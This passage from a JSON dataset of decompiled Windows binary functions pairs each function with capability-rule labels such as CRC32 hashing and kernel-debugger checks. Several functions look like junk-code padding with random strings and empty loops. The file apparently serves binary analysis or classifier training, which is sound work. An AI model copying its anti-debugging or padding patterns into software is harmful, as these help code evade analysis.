fcn.00403a35();\n        *puVar4 = 0x16;\n        fcn.004037ce();\n    }\n    iVar7 = 0;\n    iVar10 = 0;\ncode_r0x004c1268:\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    return CONCAT44(iVar10, iVar7);\n}\n",
        "token_count": 2004
    },
    "004041b5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.004041b5(uint arg_8h)\n\n{\n    int32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f548, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = lpCriticalSection;\n    if (lpCriticalSection == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.004013f7(lpCriticalSection);\n        *(unaff_EBP + -4) = 0;\n        if ((*(lpCriticalSection + 0xc) >> 0xc & 1) != 0) {\ncode_r0x004b04a1:\n            uVar2 = fcn.00403152(lpCriticalSection);\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004b04ce();\n            goto code_r0x004b04bb;\n        }\n        uVar3 = fcn.00406005(lpCriticalSection);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar5 = 0x571f68;\n        }\n        else {\n            iVar5 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x575220);\n        }\n        iVar4 = 0x571f68;\n        if (*(iVar5 + 0x29) == '\\0') {\n            if ((uVar3 != 0xffffffff) && (uVar3 != 0xfffffffe)) {\n                iVar4 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x575220);\n            }\n            if ((*(iVar4 + 0x2d) & 1) == 0) goto code_r0x004b04a1;\n        }\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        fcn.00402eaa(0x571ca8, unaff_EBP + -0x10, 0xfffffffe);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004b04bb:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 703
    },
    "004041d3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004041d3(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack336;\n    uchar auStack332 [24];\n    uchar auStack308 [24];\n    int32_t iStack284;\n    uchar auStack280 [24];\n    uchar auStack256 [24];\n    int32_t iStack232;\n    uchar auStack228 [24];\n    uchar auStack204 [24];\n    int32_t iStack180;\n    uchar auStack176 [24];\n    uchar auStack152 [24];\n    int32_t iStack128;\n    uchar auStack124 [24];\n    uchar auStack100 [52];\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffe90;\n    uStack48 = CONCAT44(noname_3, arg_10h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450660;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uStack24 = 0;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uStack24 = 5;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uVar1 = fcn.004042dc(auStack124, auStack100);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack128 = 0x25; 0 < iStack128; iStack128 = iStack128 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uStack24 = 4;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uVar1 = fcn.00405b37(auStack176, auStack152);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack180 = 0x4b; 0 < iStack180; iStack180 = iStack180 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uStack24 = 3;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uVar1 = fcn.004042dc(auStack228, auStack204);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack232 = 3; 0 < iStack232; iStack232 = iStack232 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uStack24 = 2;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uVar1 = fcn.00405b37(auStack280, auStack256);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack284 = 0x27; 0 < iStack284; iStack284 = iStack284 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uStack24 = 1;\n    fcn.00401e79(\"aasepfocuehsfrbfeuubpcyihdmjshkdseopznddtlcqcbnyribluwslgfamvfzjaa\");\n    uVar1 = fcn.00405b37(auStack332, auStack308);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack336 = 0x37; 0 < iStack336; iStack336 = iStack336 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"hcdrroe\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 1388
    },
    "00404219": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404219(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    uint var_58h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff74;\n    var_14h = 0x4517c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = 0x29b;\n    var_10h = 0;\n    fcn.00401e79(\"vtczrwxtwnxyyojoyilvtczgbdvwtanwvevotfimbbbcgtpixj\");\n    for (var_40h = 0x52; 0 < var_40h; var_40h = var_40h + -1) {\n    }\n    var_10h = 1;\n    fcn.00401e79(\"vtczrwxtwnxyyojoyilvtczgbdvwtanwvevotfimbbbcgtpixj\");\n    var_10h = 2;\n    fcn.00401e79(\"vtczrwxtwnxyyojoyilvtczgbdvwtanwvevotfimbbbcgtpixj\");\n    uVar1 = fcn.004042dc(&var_70h, &var_58h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_74h = 0x57; 0 < var_74h; var_74h = var_74h + -1) {\n        }\n    }\n    for (var_78h = 0x47; 0 < var_78h; var_78h = var_78h + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 1;\n}\n",
        "token_count": 541
    },
    "0040422d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040422d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x38;\n    fcn.00403120();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.00402513(8, uVar4);\n        *(unaff_EBP + -0x10) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406640();\n            fcn.00404714(uVar4);\n            *ppcVar2 = vtable.std::codecvt_char__char__struct__Mbstatet_.0;\n            ppcVar2[1] = NULL;\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fff();\n        }\n    }\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 353
    },
    "00404287": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404287(char *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *arg_ch_00;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        if ((arg_14h != NULL) && ((arg_8h != NULL && (arg_10h <= 0xffffffff / arg_ch)))) {\n            puVar1 = arg_14h + 3;\n            if ((*puVar1 & 0x4c0) == 0) {\n                var_4h = 0x1000;\n            }\n            else {\n                var_4h = arg_14h[6];\n            }\n            uVar6 = arg_ch * arg_10h;\n            do {\n                if (uVar6 == 0) {\n                    return arg_10h;\n                }\n                if (((arg_14h[3] & 0xc0U) == 0) || (arg_14h[2] == 0)) {\n                    if (var_4h <= uVar6) {\n                        if (((arg_14h[3] & 0xc0U) != 0) && (iVar3 = fcn.004042b9(arg_14h),  iVar3 != 0))\n                        goto code_r0x004b12b9;\n                        var_8h = uVar6;\n                        if (var_4h != 0) {\n                            var_8h = uVar6 - uVar6 % var_4h;\n                        }\n                        if (0xfffffffd < var_8h) {\n                            var_8h = 0xfffffffe;\n                        }\n                        arg_ch_00 = arg_8h;\n                        uVar4 = var_8h;\n                        arg_8h_00 = fcn.00406005(arg_14h);\n                        uVar4 = fcn.00402518(arg_8h_00, arg_ch_00, uVar4);\n                        if (uVar4 != 0xffffffff) {\n                            uVar5 = var_8h;\n                            if (uVar4 <= var_8h) {\n                                uVar5 = uVar4;\n                            }\n                            uVar6 = uVar6 - uVar5;\n                            if (var_8h <= uVar4) goto code_r0x004b1298;\n                        }\ncode_r0x004b12b0:\n                        LOCK();\n                        *puVar1 = *puVar1 | 0x10;\ncode_r0x004b12b9:\n                        return (arg_ch * arg_10h - uVar6) / arg_ch;\n                    }\n                    iVar3 = fcn.004013a2(*arg_8h, arg_14h);\n                    if (iVar3 == -1) goto code_r0x004b12b9;\n                    var_4h = arg_14h[6];\n                    uVar6 = uVar6 - 1;\n                    if (var_4h < 1) {\n                        var_4h = 1;\n                    }\n                    uVar5 = 1;\n                }\n                else {\n                    if (arg_14h[2] < 0) goto code_r0x004b12b0;\n                    if ((arg_14h[3] & 1U) != 0) goto code_r0x004b12b9;\n                    uVar5 = arg_14h[2];\n                    if (uVar6 < arg_14h[2]) {\n                        uVar5 = uVar6;\n                    }\n                    fcn.00405830(*arg_14h, arg_8h, uVar5);\n                    arg_14h[2] = arg_14h[2] - uVar5;\n                    uVar6 = uVar6 - uVar5;\n                    *arg_14h = *arg_14h + uVar5;\n                }\ncode_r0x004b1298:\n                arg_8h = arg_8h + uVar5;\n            } while( true );\n        }\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n    }\n    return 0;\n}\n",
        "token_count": 1011
    },
    "004042b9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042b9(int32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_10h;\n    \n    puVar1 = arg_8h + 3;\n    if (((*puVar1 & 3) == 2) && ((*puVar1 & 0xc0) != 0)) {\n        iVar2 = arg_8h[1];\n        iVar3 = *arg_8h - iVar2;\n        *arg_8h = iVar2;\n        arg_8h[2] = 0;\n        if (0 < iVar3) {\n            arg_10h = iVar3;\n            arg_8h_00 = fcn.00406005(arg_8h);\n            iVar2 = fcn.00402518(arg_8h_00, iVar2, arg_10h);\n            if (iVar3 != iVar2) {\n                LOCK();\n                *puVar1 = *puVar1 | 0x10;\n                return 0xffffffff;\n            }\n            if ((*puVar1 >> 2 & 1) != 0) {\n                LOCK();\n                *puVar1 = *puVar1 & 0xfffffffd;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 301
    },
    "004042dc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.004042dc(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = fcn.00405b37(arg_8h, arg_ch);\n    return (uVar1 ^ 0xff) & 1;\n}\n",
        "token_count": 68
    },
    "00404327": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00404327(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x418150;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(0x54523d);\n    uStack24 = 0;\n    fcn.00401e79(\"tyzphymzyrkdfabtbiutowmsaehpblqkkjcakstfhknglgfyrmipdchrwlkskiwfzhbwmvpnzgwtbcoriqrenyyzybzncupjasc\");\n    uStack24 = 1;\n    fcn.00401e79(\"dljgcsvdzhmahisbwkjohiiuzdbilvpttfznzbqx\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 295
    },
    "0040437c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040437c(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((*(arg_ch + 0xc) >> 0xc & 1) == 0) {\n        iVar1 = fcn.00406005(arg_ch);\n        iVar3 = 0x571f68;\n        if ((iVar1 == -1) || (iVar1 = fcn.00406005(arg_ch),  iVar1 == -2)) {\n            iVar1 = 0x571f68;\n        }\n        else {\n            iVar1 = fcn.00406005(arg_ch);\n            uVar2 = fcn.00406005(arg_ch);\n            iVar1 = *((iVar1 >> 6) * 4 + 0x575220) + (uVar2 & 0x3f) * 0x38;\n        }\n        if ((*(iVar1 + 0x29) != '\\x02') && (*(iVar1 + 0x29) != '\\x01')) {\n            iVar1 = fcn.00406005(arg_ch);\n            if ((iVar1 != -1) && (iVar1 = fcn.00406005(arg_ch),  iVar1 != -2)) {\n                iVar1 = fcn.00406005(arg_ch);\n                uVar2 = fcn.00406005(arg_ch);\n                iVar3 = *((iVar1 >> 6) * 4 + 0x575220) + (uVar2 & 0x3f) * 0x38;\n            }\n            if (*(iVar3 + 0x28) < '\\0') {\n                iVar1 = fcn.00402abd(&var_10h, &var_ch, 5, arg_8h);\n                if ((iVar1 == 0) && (iVar1 = 0,  0 < var_10h)) {\n                    do {\n                        iVar3 = fcn.00404705(*(&var_ch + iVar1), arg_ch);\n                        if (iVar3 == -1) break;\n                        iVar1 = iVar1 + 1;\n                    } while (iVar1 < var_10h);\n                }\n                goto code_r0x004c5b3b;\n            }\n        }\n        fcn.004c59e3(arg_8h, arg_ch);\n    }\n    else {\n        fcn.004c59e3(arg_8h, arg_ch);\n    }\ncode_r0x004c5b3b:\n    fcn.004030bc(var_10h);\n    return;\n}\n",
        "token_count": 628
    },
    "004043a9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004043a9(uint32_t arg_8h, char **arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char **ppcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    if ((arg_ch[3] >> 0xc & 1) == 0) {\n        uVar1 = fcn.00406005(arg_ch);\n        iVar7 = 0x571f68;\n        if ((uVar1 == 0xffffffff) || (uVar1 == 0xfffffffe)) {\n            iVar6 = 0x571f68;\n        }\n        else {\n            iVar6 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x575220);\n        }\n        if (*(iVar6 + 0x29) == '\\0') {\n            if ((uVar1 != 0xffffffff) && (uVar1 != 0xfffffffe)) {\n                iVar7 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x575220);\n            }\n            if ((*(iVar7 + 0x2d) & 1) == 0) goto code_r0x004b16de;\n        }\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n    }\n    else {\ncode_r0x004b16de:\n        if ((arg_8h != 0xffffffff) && (((arg_ch[3] & 1) != 0 || ((arg_ch[3] & 6) == 6)))) {\n            pcVar3 = arg_ch[1];\n            if (pcVar3 == NULL) {\n                fcn.00401ffa(arg_ch);\n                pcVar3 = arg_ch[1];\n            }\n            ppcVar5 = arg_ch + 3;\n            if (*arg_ch == pcVar3) {\n                if (arg_ch[2] != NULL) {\n                    return 0xffffffff;\n                }\n                *arg_ch = *arg_ch + 1;\n            }\n            pcVar3 = *arg_ch;\n            pcVar4 = pcVar3 + -1;\n            *arg_ch = pcVar4;\n            if ((*ppcVar5 >> 0xc & 1) == 0) {\n                *pcVar4 = arg_8h;\n            }\n            else if (*pcVar4 != arg_8h) {\n                *arg_ch = pcVar3;\n                return 0xffffffff;\n            }\n            arg_ch[2] = arg_ch[2] + 1;\n            LOCK();\n            *ppcVar5 = *ppcVar5 & 0xfffffff7;\n            LOCK();\n            *ppcVar5 = *ppcVar5 | 1;\n            return arg_8h & 0xff;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 678
    },
    "004043c7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004043c7(uint arg_8h)\n\n{\n    fcn.00403b02(*0x546a28, 0x142e);\n    return 1;\n}\n",
        "token_count": 45
    },
    "004043db": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl\nfcn.004043db(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint noname_10, uint arg_34h, uint noname_12, uint arg_3ch, \n            uint noname_14, uint arg_44h)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack396;\n    uchar auStack392 [24];\n    uchar auStack368 [24];\n    int32_t iStack344;\n    uchar auStack340 [24];\n    uchar auStack316 [24];\n    int32_t iStack292;\n    uchar auStack288 [24];\n    uchar auStack264 [24];\n    int32_t iStack240;\n    uchar auStack236 [24];\n    uchar auStack212 [24];\n    int32_t iStack188;\n    uchar auStack184 [24];\n    uchar auStack160 [55];\n    uint8_t uStack105;\n    ulong uStack104;\n    uint8_t uStack89;\n    ulong uStack88;\n    uchar uStack73;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffe60;\n    uStack48 = CONCAT44(noname_14, arg_3ch);\n    uStack56 = CONCAT44(noname_12, arg_34h);\n    uStack64 = CONCAT44(noname_10, arg_2ch);\n    uStack72 = CONCAT44(noname_8, arg_24h);\n    uStack88 = CONCAT44(noname_5, arg_18h);\n    uStack104 = CONCAT44(noname_2, arg_ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4502a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_44h & 1;\n    uVar2 = CONCAT11(arg_20h, arg_8h) & 0x1ff;\n    uStack73 = uVar2 >> 8;\n    uStack89 = arg_14h & 1;\n    uStack105 = uVar2 & 1;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uStack24 = 0;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uStack24 = 5;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uVar1 = fcn.00405b37(auStack184, auStack160);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack188 = 0x37; 0 < iStack188; iStack188 = iStack188 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uStack24 = 4;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uVar1 = fcn.00405b37(auStack236, auStack212);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack240 = 0x43; 0 < iStack240; iStack240 = iStack240 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uStack24 = 3;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uVar1 = fcn.004042dc(auStack288, auStack264);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack292 = 0x3e; 0 < iStack292; iStack292 = iStack292 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uStack24 = 2;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uVar1 = fcn.004042dc(auStack340, auStack316);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack344 = 4; 0 < iStack344; iStack344 = iStack344 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uStack24 = 1;\n    fcn.00401e79(\"legpgwlmevauzfozjpmftypazisjatvhkuyztdlmsoxpigboienqosxerswkjihmnapvrfcluiuprduymbxmrv\");\n    uVar1 = fcn.004042dc(auStack392, auStack368);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack396 = 0xb; 0 < iStack396; iStack396 = iStack396 + -1) {\n        }\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546b64;\n}\n",
        "token_count": 1774
    },
    "0040442b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0040442b(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack180;\n    uchar auStack176 [24];\n    uchar auStack152 [24];\n    int32_t iStack128;\n    int32_t iStack124;\n    ulong uStack120;\n    ulong uStack112;\n    uint uStack80;\n    uint uStack52;\n    uint uStack48;\n    uchar uStack41;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff38;\n    uStack28 = 0x450380;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack41 = 1;\n    uStack48 = 0x366;\n    uStack52 = 0x4c5;\n    uStack24 = 0;\n    fcn.00401e79(\"edtgwqeatbecakjucttmntkxdvokkooqgyybvlykysqunksgxaoxjz\");\n    uStack80 = 0x1575;\n    uStack24 = 1;\n    fcn.00401e79(\"cxbbcclkozehvxaftxjkznwotrvzgldswxbdrojezhfjmlwigcxoyuhqhknjgvaomdkzgtmogvtkngkuptwv\");\n    uStack112 = *0x546c28;\n    uStack120 = *0x546c18;\n    for (iStack124 = 0x4b; 0 < iStack124; iStack124 = iStack124 + -1) {\n    }\n    for (iStack128 = 0x37; 0 < iStack128; iStack128 = iStack128 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"edtgwqeatbecakjucttmntkxdvokkooqgyybvlykysqunksgxaoxjz\");\n    uStack24 = 3;\n    fcn.00401e79(\"edtgwqeatbecakjucttmntkxdvokkooqgyybvlykysqunksgxaoxjz\");\n    uVar1 = fcn.004042dc(auStack176, auStack152);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack180 = 0xc; 0 < iStack180; iStack180 = iStack180 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 677
    },
    "00404444": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
